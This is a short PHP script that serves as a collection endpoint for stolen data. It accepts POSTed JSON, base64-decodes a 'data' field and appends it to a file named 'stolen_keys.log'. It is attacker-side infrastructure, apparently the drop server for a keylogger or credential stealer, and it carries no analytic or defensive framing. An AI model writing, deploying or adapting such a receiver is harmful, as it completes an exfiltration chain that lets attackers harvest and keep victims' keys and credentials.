<?php
$data = json_decode(file_get_contents('php://input'), true);
if (isset($data['data'])) {
    $logEntry = base64_decode($data['data']) . "\n---\n";
    file_put_contents('stolen_keys.log', $logEntry, FILE_APPEND);
    http_response_code(200);
}
?>
